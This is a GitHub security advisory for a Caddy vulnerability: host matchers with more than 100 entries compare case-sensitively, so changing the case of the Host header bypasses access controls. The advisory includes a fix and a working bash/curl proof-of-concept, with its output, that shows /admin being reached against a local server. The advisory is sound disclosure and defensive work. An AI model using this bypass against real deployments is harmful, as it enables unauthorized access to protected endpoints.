# [H] Caddy: MatchHost becomes case-sensitive for large host lists (>100), enabling host-based route/auth bypass

## Summary
Severity: High
Advisory: GHSA-x76f-jf84-rqj8
CVE: CVE-2026-27588
CWE: CWE-178
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-02-24
Source: https://github.com/advisories/GHSA-x76f-jf84-rqj8
Type: github-advisory

## Affected
- Go: `github.com/caddyserver/caddy/v2` — affected >=0 <2.11.1

## Details
### Summary
Caddy's HTTP `host` request matcher is documented as case-insensitive, but when configured with a large host list (>100 entries) it becomes case-sensitive due to an optimized matching path. An attacker can bypass host-based routing and any access controls attached to that route by changing the casing of the `Host` header.

### Details
In Caddy `v2.10.2`, the `MatchHost` matcher states it matches the Host value case-insensitively:

- `modules/caddyhttp/matchers.go`: `type MatchHost matches requests by the Host value (case-insensitive).`

However, in `MatchHost.MatchWithError`, when the host list is considered "large" (`len(m) > 100`):

- `MatchHost.large()` returns true for `len(m) > 100` (`modules/caddyhttp/matchers.go`, around the `large()` helper).
- The matcher takes a "fast path" using binary search over the sorted host list, and checks for an exact match using a case-sensitive string comparison (`m[pos] == reqHost`).
- After the fast path fails, the fallback loop short-circuits for large lists by breaking as soon as it reaches the first non-fuzzy entry. For configs comprised of exact hostnames only (no wildcards/placeholders), this prevents the `strings.EqualFold(reqHost, host)` check from ever running.

Net effect: with a host list length of 101 or more, changing only the casing of the incoming `Host` header can cause the `host` matcher to not match when it should.

#### Suggested fix
- Normalize exact hostnames to lower-case during `MatchHost.Provision` (at least for non-fuzzy entries).
- Normalize the incoming request host (`reqHost`) to lower-case before the large-list binary search + equality check, so the optimized path stays case-insensitive.

Reproduced on:
- Stable release: `v2.10.2` -- this is the release I reference in the repro below.
- Dev build: `v2.11.0-beta.2`.
- Master tip: commit `58968b3fd38cacbf4b5e07cc8c8be27696dce60f`.

### PoC
Prereqs:
- bash, curl
- A pre-built Caddy binary available at `/opt/caddy-2.10.2/caddy` (edit `CADDY_BIN` in the script if needed)

<details>
<summary>Script (Click to expand)</summary>

```bash
#!/usr/bin/env bash
set -euo pipefail

CADDY_BIN="/opt/caddy-2.10.2/caddy"
HOST="127.0.0.1"
PORT="8080"

TMPDIR="$(mktemp -d)"
CADDYFILE="${TMPDIR}/Caddyfile"
LOG="${TMPDIR}/caddy.log"

cleanup() {
  if [ -n "${CADDY_PID:-}" ] && kill -0 "${CADDY_PID}" 2>/dev/null; then
    kill "${CADDY_PID}" 2>/dev/null || true
    wait "${CADDY_PID}" 2>/dev/null || true
  fi
  rm -rf "${TMPDIR}" 2>/dev/null || true
}
trap cleanup EXIT

if [ ! -x "${CADDY_BIN}" ]; then
  echo "error: missing caddy binary at ${CADDY_BIN}" >&2
  exit 2
fi

echo "== Caddy version =="
"${CADDY_BIN}" version

cat >"${CADDYFILE}" <<EOF
{
    debug
}

:${PORT} {
    log
    @protected {
        host h001.test h002.test h003.test h004.test h005.test h006.test h007.test h008.test h009.test h010.test h011.test h012.test h013.test h014.test h015.test h016.test h017.test h018.test h019.test h020.test h021.test h022.test h023.test h024.test h025.test h026.test h027.test h028.test h029.test h030.test h031.test h032.test h033.test h034.test h035.test h036.test h037.test h038.test h039.test h040.test h041.test h042.test h043.test h044.test h045.test h046.test h047.test h048.test h049.test h050.test h051.test h052.test h053.test h054.test h055.test h056.test h057.test h058.test h059.test h060.test h061.test h062.test h063.test h064.test h065.test h066.test h067.test h068.test h069.test h070.test h071.test h072.test h073.test h074.test h075.test h076.test h077.test h078.test h079.test h080.test h081.test h082.test h083.test h084.test h085.test h086.test h087.test h088.test h089.test h090.test h091.test h092.test h093.test h094.test h095.test h096.test h097.test h098.test h099.test h100.test h101.test
        path /admin
    }
    respond @protected "DENY" 403
    respond "ALLOW" 200
}
EOF

echo
echo "== Caddyfile =="
cat "${CADDYFILE}"

echo
echo "== Start Caddy (debug + capture logs) =="
echo "cmd: ${CADDY_BIN} run --config ${CADDYFILE} --adapter caddyfile"
"${CADDY_BIN}" run --config "${CADDYFILE}" --adapter caddyfile >"${LOG}" 2>&1 &
CADDY_PID="$!"

sleep 2

echo
echo "== Request 1 (baseline - expect deny) =="
echo "cmd: curl -v -H 'Host: h050.test' http://${HOST}:${PORT}/admin"
curl -v -H "Host: h050.test" "http://${HOST}:${PORT}/admin" 2>&1 || true

echo
echo "== Request 2 (BYPASS - expect allow) =="
echo "cmd: curl -v -H 'Host: H050.TEST' http://${HOST}:${PORT}/admin"
curl -v -H "Host: H050.TEST" "http://${HOST}:${PORT}/admin" 2>&1 || true

echo
echo "== Stop Caddy =="
kill "${CADDY_PID}" 2>/dev/null || true
wait "${CADDY_PID}" 2>/dev/null || true

echo
echo "== Full Caddy debug log =="
cat "${LOG}"

```
</details>

<details>
<summary>Expected output (Click to expand)</summary>

```bash
== Caddy version ==
v2.10.2 h1:g/gTYjGMD0dec+UgMw8SnfmJ3I9+M2TdvoRL/Ovu6U8=

== Caddyfile ==
{
    debug
}

:8080 {
    log
    @protected {
        host h001.test h002.test h003.test h004.test h005.test h006.test h007.test h008.test h009.test h010.test h011.test h012.test h013.test h014.test h015.test h016.test h017.test h018.test h019.test h020.test h021.test h022.test h023.test h024.test h025.test h026.test h027.test h028.test h029.test h030.test h031.test h032.test h033.test h034.test h035.test h036.test h037.test h038.test h039.test h040.test h041.test h042.test h043.test h044.test h045.test h046.test h047.test h048.test h049.test h050.test h051.test h052.test h053.test h054.test h055.test h056.test h057.test h058.test h059.test h060.test h061.test h062.test h063.test h064.test h065.test h066.test h067.test h068.test h069.test h070.test h071.test h072.test h073.test h074.test h075.test h076.test h077.test h078.test h079.test h080.test h081.test h082.test h083.test h084.test h085.test h086.test h087.test h088.test h089.test h090.test h091.test h092.test h093.test h094.test h095.test h096.test h097.test h098.test h099.test h100.test h101.test
        path /admin
    }
    respond @protected "DENY" 403
    respond "ALLOW" 200
}

== Start Caddy (debug + capture logs) ==
cmd: /opt/caddy-2.10.2/caddy run --config /tmp/tmp.3BN6rgj9yF/Caddyfile --adapter caddyfile

== Request 1 (baseline - expect deny) ==
cmd: curl -v -H 'Host: h050.test' http://127.0.0.1:8080/admin
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: h050.test
> User-Agent: curl/8.15.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 403 Forbidden
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Sun, 08 Feb 2026 22:09:09 GMT
< Content-Length: 4
<
* Connection #0 to host 127.0.0.1 left intact
DENY
== Request 2 (BYPASS - expect allow) ==
cmd: curl -v -H 'Host: H050.TEST' http://127.0.0.1:8080/admin
*   Trying 127.0.0.1:8080...
* Connected to 127.0.0.1 (127.0.0.1) port 8080
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: H050.TEST
> User-Agent: curl/8.15.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Content-Type: text/plain; charset=utf-8
< Server: Caddy
< Date: Sun, 08 Feb 2026 22:09:09 GMT
< Content-Length: 5
<
* Connection #0 to host 127.0.0.1 left intact
ALLOW
== Stop Caddy ==

== Full Caddy debug log ==
{"level":"info","ts":1770588548.012352,"msg":"maxprocs: Leaving GOMAXPROCS=4: CPU quota undefined"}
{"level":"info","ts":1770588548.0125406,"msg":"GOMEMLIMIT is updated","package":"github.com/KimMachineGun/automemlimit/memlimit","GOMEMLIMIT":1844136345,"previous":9223372036854775807}
{"level":"info","ts":1770588548.0125597,"msg":"using config from file","file":"/tmp/tmp.3BN6rgj9yF/Caddyfile"}
{"level":"info","ts":1770588548.0131946,"msg":"adapted config to JSON","adapter":"caddyfile"}
{"level":"warn","ts":1770588548.013202,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"/tmp/tmp.3BN6rgj9yF/Caddyfile","line":2}
{"level":"info","ts":1770588548.0139973,"logger":"admin","msg":"admin endpoint started","address":"localhost:2019","enforce_origin":false,"origins":["//127.0.0.1:2019","//localhost:2019","//[::1]:2019"]}
{"level":"debug","ts":1770588548.0140707,"logger":"http.auto_https","msg":"adjusted config","tls":{"automation":{"policies":[{}]}},"http":{"servers":{"srv0":{"listen":[":8080"],"routes":[{"handle":[{"handler":"subroute","routes":[{"handle":[{"body":"DENY","handler":"static_response","status_code":403}],"match":[{"host":["h001.test","h002.test","h003.test","h004.test","h005.test","h006.test","h007.test","h008.test","h009.test","h010.test","h011.test","h012.test","h013.test","h014.test","h015.test","h016.test","h017.test","h018.test","h019.test","h020.test","h021.test","h022.test","h023.test","h024.test","h025.test","h026.test","h027.test","h028.test","h029.test","h030.test","h031.test","h032.test","h033.test","h034.test","h035.test","h036.test","h037.test","h038.test","h039.test","h040.test","h041.test","h042.test","h043.test","h044.test","h045.test","h046.test","h047.test","h048.test","h049.test","h050.test","h051.test","h052.test","h053.test","h054.test","h055.test","h056.test","h057.test","h058.test","h059.test","h060.test","h061.test","h062.test","h063.test","h064.test","h065.test","h066.test","h067.test","h068.test","h069.test","h070.test","h071.test","h072.test","h073.test","h074.test","h075.test","h076.test","h077.test","h078.test","h079.test","h080.test","h081.test","h082.test","h083.test","h084.test","h085.test","h086.test","h087.test","h088.test","h089.test","h090.test","h091.test","h092.test","h093.test","h094.test","h095.test","h096.test","h097.test","h098.test","h099.test","h100.test","h101.test"],"path":["/admin"]}]},{"handle":[{"body":"ALLOW","handler":"static_response","status_code":200}]}]}],"terminal":true}],"automatic_https":{},"logs":{}}}}}
{"level":"info","ts":1770588548.0143135,"logger":"tls.cache.maintenance","msg":"started background certificate maintenance","cache":"0xc0000d7c80"}
{"level":"debug","ts":1770588548.0143793,"logger":"http","msg":"starting server loop","address":"[::]:8080","tls":false,"http3":false}
{"level":"warn","ts":1770588548.014415,"logger":"http","msg":"HTTP/2 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"warn","ts":1770588548.0144184,"logger":"http","msg":"HTTP/3 skipped because it requires TLS","network":"tcp","addr":":8080"}
{"level":"info","ts":1770588548.0144203,"logger":"http.log","msg":"server running","name":"srv0","protocols":["h1","h2","h3"]}
{"level":"debug","ts":1770588548.014438,"logger":"events","msg":"event","name":"started","id":"1c7f6534-d264-456d-988d-e9f77a099c42","origin":"","data":null}
{"level":"info","ts":1770588548.0145273,"msg":"autosaved config (load with --resume flag)","file":"/home/vh/.config/caddy/autosave.json"}
{"level":"info","ts":1770588548.0145316,"msg":"serving initial configuration"}
{"level":"info","ts":1770588548.0274432,"logger":"tls","msg":"storage cleaning happened too recently; skipping for now","storage":"FileStorage:/home/vh/.local/share/caddy","instance":"a259f82d-3c7c-4706-9ca8-17456b4af729","try_again":1770674948.0274422,"try_again_in":86399.999999709}
{"level":"info","ts":1770588548.0275078,"logger":"tls","msg":"finished cleaning storage units"}
{"level":"info","ts":1770588549.9694445,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"127.0.0.1","remote_port":"53220","client_ip":"127.0.0.1","proto":"HTTP/1.1","method":"GET","host":"h050.test","uri":"/admin","headers":{"User-Agent":["curl/8.15.0"],"Accept":["*/*"]}},"bytes_read":0,"user_id":"","duration":0.000014857,"size":4,"status":403,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}
{"level":"info","ts":1770588549.9741833,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"127.0.0.1","remote_port":"53234","client_ip":"127.0.0.1","proto":"HTTP/1.1","method":"GET","host":"H050.TEST","uri":"/admin","headers":{"Accept":["*/*"],"User-Agent":["curl/8.15.0"]}},"bytes_read":0,"user_id":"","duration":0.00000551,"size":5,"status":200,"resp_headers":{"Server":["Caddy"],"Content-Type":["text/plain; charset=utf-8"]}}
{"level":"info","ts":1770588549.9751372,"msg":"shutting down apps, then terminating","signal":"SIGTERM"}
{"level":"warn","ts":1770588549.9751456,"msg":"exiting; byeee!! 👋","signal":"SIGTERM"}
{"level":"debug","ts":1770588549.9751775,"logger":"events","msg":"event","name":"stopping","id":"e02c5e64-9d76-48b6-a967-4f003850bdd4","origin":"","data":null}
{"level":"info","ts":1770588549.9751873,"logger":"http","msg":"servers shutting down with eternal grace period"}
{"level":"info","ts":1770588549.975331,"logger":"admin","msg":"stopped previous server","address":"localhost:2019"}
{"level":"info","ts":1770588549.9753368,"msg":"shutdown complete","signal":"SIGTERM","exit_code":0}
```
</details>

### Impact
This is a route/auth bypass in Caddy's request-matching layer. Any internet-exposed Caddy deployment that relies on `host` matchers with large host lists (>100) to select protected routes (e.g. applying `basicauth`, `forward_auth`, `respond` deny rules, or protecting `reverse_proxy` backends) can be bypassed by varying the case of the `Host` header, allowing unauthorized access to sensitive endpoints depending on upstream configuration.

The reproduction is minimal per the reporting guidance; a realistic "full" scenario is Caddy fronting a multi-tenant app and doing `forward_auth`/`basicauth`/`deny` for `/admin` only when host is in a big (>100) allowlist, but the default handler still `reverse_proxy`ing to the same app. Then sending `Host: H050.TEST` skips the guarded route in Caddy, yet the upstream still treats it as the same tenant host --> `/admin` is reachable without the intended guard.


### AI Use Disclosure
A custom AI agent pipeline was used to discover the vulnerability, after which was manually reproduced and validated each step. The entire report was ran through an LLM for editing.

### Disclosure/crediting

Asim Viladi Oglu Manizada

## References
- https://github.com/caddyserver/caddy/security/advisories/GHSA-x76f-jf84-rqj8
- https://nvd.nist.gov/vuln/detail/CVE-2026-27588
- https://github.com/caddyserver/caddy/commit/eec32a0bb5a11651c6a7b04ce82dc50610f2b27e
- https://github.com/caddyserver/caddy
- https://github.com/caddyserver/caddy/releases/tag/v2.11.1
- https://pkg.go.dev/vuln/GO-2026-4541
